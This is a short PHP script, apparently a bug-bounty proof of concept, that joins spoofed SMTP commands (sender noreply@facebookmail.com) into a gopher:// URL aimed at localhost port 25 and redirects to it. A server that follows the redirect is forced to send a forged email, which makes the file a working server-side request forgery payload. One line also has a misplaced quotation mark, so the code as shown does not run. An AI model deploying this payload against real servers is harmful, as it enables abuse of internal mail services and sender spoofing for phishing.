<?php
	$commands = array(
		'HELO facebookmail.com',
		'MAIL FROM: <noreply@facebookmail.com>',
		'RCPT To: <bug.allmight@gmail.com'>,
		'DATA',
		'Subject: facebook.com',
		'you sexy',
	);
	
	$payload = implode('%0A', $commands);

	header('Location: gopher://0:25/_'.$payload);
?>
